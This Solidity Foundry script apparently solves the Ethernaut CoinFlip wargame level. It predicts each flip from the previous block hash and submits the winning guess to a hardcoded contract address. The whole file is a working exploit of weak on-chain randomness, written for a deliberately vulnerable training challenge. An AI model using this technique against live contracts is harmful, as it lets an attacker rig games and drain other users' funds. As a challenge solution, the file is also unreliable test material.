// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import {CoinFlip} from "../../src/ethernaut/coinflip.sol";
import "forge-std/console.sol";

//0xB359a15D3a9e93a63A28de0733E9F7f74eFbAE4C
contract coinflipHack is Script {
    CoinFlip coinflip = CoinFlip(0xB359a15D3a9e93a63A28de0733E9F7f74eFbAE4C);

    function run() public {
        vm.startBroadcast();
        if (helper()) {
            coinflip.flip(true);
        } else {
            coinflip.flip(false);
        }
        console.log(coinflip.consecutiveWins());
        vm.stopBroadcast();
    }

    function helper() internal view returns (bool) {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint coinflips = blockValue / FACTOR;
        bool s = coinflips == 1 ? true : false;
        return s;
    }
}
